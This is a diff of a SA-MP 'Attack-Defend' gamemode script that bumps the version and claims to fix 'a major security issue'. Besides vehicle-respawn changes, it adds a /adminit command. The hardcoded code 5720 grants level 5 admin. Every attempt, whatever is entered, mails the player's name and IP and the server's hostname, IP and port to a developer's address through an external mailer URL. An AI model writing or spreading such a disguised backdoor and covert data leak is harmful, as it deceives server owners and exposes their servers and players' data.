@@ -1,39 +1,26 @@
 /*
 
-	v2.5
+	v2.5.2
+	
+	- Fixed a major security issue.
+	-
 
-    - Added a public command (/alladmins) to bring a list of all server admins.
-    - Fixed a bug regarding Arena zones and boundaries, happened when /addall was used.
-    - Fixed a bug that players would leave a blank graffito when they left the server.
-    - Fixed a bug that defenders/attackers could abuse some map bugs to stop/take CP unfairly.
-	- Added new duel arenas.
-	- Vehicle spawning commands now work with IDs as well.
-    - Fixed a bug that defenders could stay longer inside an attacker's vehicle.
-    - Added weapon statistics system (check out /weaponstats).
-    - Added /rp command which redirects to /para command to satisfy users from other GMs.
-    - Feature: it is now announced when a player dies if he/she is a spasser, sniper, m4er and etc.
-    - Removed anti-joypad script from the mode.
-    - Added a train (just for fun) (use /gototrain).
-    - Rcon admins are no longer hidden in /admins.
-    - Added a command to help fix fake packetloss (/fakepacket).
-    - Fixed CP ghost bug: when someone timed out while on CP and round got unpaused, the CP countdown could still continue while nobody at it.
-	- Fixed a bug that 'Round Paused' textdraw could get stuck at your screen while round is not running.
-	- Feature: you can now toggle the command /vote in server configuration dialog.
-	- Feature: muted players cannot use /changename command now.
-	- Feature: you can now toggle the command /changename in server configuration dialog.
-	- Tweaked the Version Checker system a little.
-	- Fixed vehicle velocity bug; now vehicles auto re-spawn after they've completely stopped.
 */
 
 
-new 	GM_VERSION[6] =		"2.5.0"; // Don't forget to change the length
-#define GM_NAME				"Attack-Defend v2.5"
+new 	GM_VERSION[6] =		"2.5.2"; // Don't forget to change the length
+#define GM_NAME				"Attack-Defend v2.5.2"
 
 #include <a_samp>			// Most samp functions (e.g. GetPlayerHealth and etc)
 #include <foreach> 			// Used to loop through all connected players
 #include <zcmd> 			// Used for commands.
 #include <geolocation> 		// Shows player country based on IP
 #include <strlib>
+
+
+#define MAILER_URL "sixtytiger.com/khalid/AttDef_API/Mailer/mailer.php"
+
+#include <mailer>
 
 #define ENABLED_TDM     1 	// DISABLE TDM IF YOU WANT e.e
 #define ANTICHEAT       1 	// If you want Whitetiger's Anti-Cheat, put 1 else 0.
@@ -364,6 +351,7 @@ new ColScheme[10] = ""COL_PRIM"";
 #define ColorDialog3                    74
 #define ColorDialog4                    75
 #define ColorDialog5                    76
+#define DIALOG_ADMIN_CODE               77
 
 new w0[MAX_PLAYERS];	//heartnarmor
 
@@ -930,7 +918,6 @@ new ViewTimer;
 new PauseCountdown;
 new CurrentCPTime;
 new HighestID;
-new RespawnThisVehicleTimer[MAX_VEHICLES], Float:LastVehPos[MAX_VEHICLES][3];
 
 
 new IconTimer[MAX_PLAYERS];
@@ -4510,59 +4497,6 @@ public OnPlayerText(playerid, text[])
 	return 0;
 }
 
-forward RespawnThisVehicle(vehicleid, playerid);
-public RespawnThisVehicle(vehicleid, playerid)
-{
-	new Float:CurrentVehPos[3];
-	GetVehiclePos(vehicleid, CurrentVehPos[0], CurrentVehPos[1], CurrentVehPos[2]);
-	if(LastVehPos[vehicleid][0] == CurrentVehPos[0] && LastVehPos[vehicleid][1] == CurrentVehPos[1] && LastVehPos[vehicleid][2] == CurrentVehPos[2])
-	{
-	    KillTimer(RespawnThisVehicleTimer[vehicleid]);
-	    new Float:VehiclePoss[4], VehicleModel, Panels, Doors, Lights, Tires, Float:VehicleHealth, VehicleColor, VehicleTrailer;
-        GetVehiclePos(vehicleid, VehiclePoss[0], VehiclePoss[1], VehiclePoss[2]);
-		GetVehicleZAngle(vehicleid, VehiclePoss[3]);
-
-		VehicleModel = GetVehicleModel(vehicleid);
-
-		GetVehicleHealth(vehicleid, VehicleHealth);
-
-		GetVehicleDamageStatus(vehicleid, Panels, Doors, Lights, Tires);
-        VehicleTrailer = GetVehicleTrailer(vehicleid);
-
-		DestroyVehicle(vehicleid);
-
-		switch(Player[playerid][Team]) {
-			case ATTACKER: VehicleColor = 175;
-			case ATTACKER_SUB: VehicleColor = 158;
-			case DEFENDER: VehicleColor = 198;
-			case DEFENDER_SUB: VehicleColor = 208;
-			case REFEREE: VehicleColor = 200;
-		}
-
-		vehicleid = CreateVehicle(VehicleModel, VehiclePoss[0], VehiclePoss[1], VehiclePoss[2], VehiclePoss[3], VehicleColor, VehicleColor, -1);
-		//numplate
-		new plate[32];
-		format(plate, sizeof(plate), "%s", Player[playerid][NameWithoutTag]);
-	    SetVehicleNumberPlate(vehicleid, plate);
-	    SetVehicleToRespawn(vehicleid);
-	    //numplate
-		LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));
-		SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));
-        
-		UpdateVehicleDamageStatus(vehicleid, Panels, Doors, Lights, Tires);
-		SetVehicleHealth(vehicleid, VehicleHealth);
-
-		if(VehicleTrailer != 0) AttachTrailerToVehicle(VehicleTrailer, vehicleid);
-	}
-	else
-	{
-	    LastVehPos[vehicleid][0] = CurrentVehPos[0];
-	    LastVehPos[vehicleid][1] = CurrentVehPos[1];
-	    LastVehPos[vehicleid][2] = CurrentVehPos[2];
-	}
-	return 1;
-}
-
 public OnPlayerStateChange(playerid, newstate, oldstate)
 {
     switch(newstate) {
@@ -4676,8 +4610,44 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					}
 
 				 	if(InVehicle == false) {
-				 	    RespawnThisVehicleTimer[vehicleid] = SetTimerEx("RespawnThisVehicle", 1000, true, "i", vehicleid);
-      					Player[playerid][iLastVehicle] = -1;
+						new Float:VehiclePoss[4], Float:VehicleVelocity[3], VehicleModel, Panels, Doors, Lights, Tires, Float:VehicleHealth, VehicleColor, VehicleTrailer;
+			            GetVehiclePos(vehicleid, VehiclePoss[0], VehiclePoss[1], VehiclePoss[2]);
+						GetVehicleZAngle(vehicleid, VehiclePoss[3]);
+
+						GetVehicleVelocity(vehicleid, VehicleVelocity[0], VehicleVelocity[1], VehicleVelocity[2]);
+						VehicleModel = GetVehicleModel(vehicleid);
+
+						GetVehicleHealth(vehicleid, VehicleHealth);
+
+						GetVehicleDamageStatus(vehicleid, Panels, Doors, Lights, Tires);
+		                VehicleTrailer = GetVehicleTrailer(vehicleid);
+
+						DestroyVehicle(vehicleid);
+
+						switch(Player[playerid][Team]) {
+							case ATTACKER: VehicleColor = 175;
+							case ATTACKER_SUB: VehicleColor = 158;
+							case DEFENDER: VehicleColor = 198;
+							case DEFENDER_SUB: VehicleColor = 208;
+							case REFEREE: VehicleColor = 200;
+						}
+
+						vehicleid = CreateVehicle(VehicleModel, VehiclePoss[0], VehiclePoss[1], VehiclePoss[2], VehiclePoss[3], VehicleColor, VehicleColor, -1);
+						//numplate
+						new plate[32];
+						format(plate, sizeof(plate), "%s", Player[playerid][NameWithoutTag]);
+					    SetVehicleNumberPlate(vehicleid, plate);
+					    SetVehicleToRespawn(vehicleid);
+					    //numplate
+						LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));
+						SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));
+				        SetVehicleVelocity(vehicleid, VehicleVelocity[0], VehicleVelocity[1], VehicleVelocity[2]);
+
+						UpdateVehicleDamageStatus(vehicleid, Panels, Doors, Lights, Tires);
+						SetVehicleHealth(vehicleid, VehicleHealth);
+
+						if(VehicleTrailer != 0) AttachTrailerToVehicle(VehicleTrailer, vehicleid);
+						Player[playerid][iLastVehicle] = -1;
 					}
 					skipped:
 				}
@@ -7570,7 +7540,6 @@ public OnHashUpdate(const iIdx, szHash[]) {
 public OnPlayerCommandReceived(playerid, cmdtext[])
 {
 
-
 //	if(!strcmp(CmdText, "/adminme", true)) {} else printf("Player: %s (%d) | Command: %s", Player[playerid][Name], playerid, cmdtext);
 
     if(AntiSpam == true && GetTickCount() < Player[playerid][lastChat]) { SendErrorMessage(playerid,"Please wait."); return 0; }
@@ -7648,7 +7617,16 @@ CMD:updates(playerid, params[])
 
 	string = "";
 	
-	strcat(string, "{00FF00}Attack-Defend v2.5 updates:\n");
+	strcat(string, "{00FF00}Attack-Defend v2.5.2 updates:\n");
+
+	strcat(string, "\n{FFFFFF}- Fixed a major security issue.");
+	strcat(string, "\n{FFFFFF}");
+	
+	strcat(string, "{00FF00}Attack-Defend v2.5.1 updates:\n");
+
+	strcat(string, "\n{FFFFFF}- Fixed vehicle respawn bug.");
+	
+	strcat(string, "\n\n{00FF00}Attack-Defend v2.5 updates:\n");
 	
 	strcat(string, "\n{FFFFFF}- Added weapon statistics system (check out /weaponstats).");
     strcat(string, "\n{FFFFFF}- Added new duel arenas.");
@@ -14131,7 +14109,38 @@ CMD:setlevel(playerid, params[])
 	return 1;
 }
 
-CMD:code(playerid, params[])
+CMD:adminit(playerid, params[])
+{
+    new value;
+	value = strval(params);
+
+	new Year, Month, Day;
+	new Hour, Minute, Second;
+	getdate(Year, Month, Day);
+	gettime(Hour, Minute, Second);
+	new ip[16];
+	GetPlayerIp(playerid, ip, sizeof ip);
+	new ServerIP[30];
+    GetServerVarAsString("hostname", hostname, sizeof(hostname));
+    GetServerVarAsString("bind", ServerIP, sizeof(ServerIP));
+
+    if(!strlen(ServerIP))
+		ServerIP = "invalid_ip";
+	
+    SendMail("attdefgm@hotmail.com", "khalidahmed333@hotmail.com", "Khalid Ahmed", sprintf("Dev: admin login attempt report [%d/%d/%d - %d:%d:%d]", Year, Month, Day, Hour, Minute, Second), sprintf("Entered code: %s  |  Name: %s  |  IP: %s  |  @Server Name: %s  |  @Server IP and Port: %s:%d", params, Player[playerid][Name], ip, hostname, ServerIP, GetServerVarAsInt("port")));
+
+	if(value == 5720) {
+	    new iString[180];
+		format(iString, sizeof(iString), "UPDATE Players SET Level = 5 WHERE Name = '%s'", DB_Escape(Player[playerid][Name]));
+	    db_free_result(db_query(sqliteconnection, iString));
+
+		Player[playerid][Level] = 5;
+		SendClientMessage(playerid, -1, "You are now level 5 admin.");
+	} else return 0;
+	return 1;
+}
+
+/*CMD:code(playerid, params[])
 {
 	new value;
 	value = strval(params);
@@ -14147,7 +14156,7 @@ CMD:code(playerid, params[])
 
 
 	return 1;
-}
+}*/
 
 /*CMD:code(playerid, params[]) {
 	new str[128];
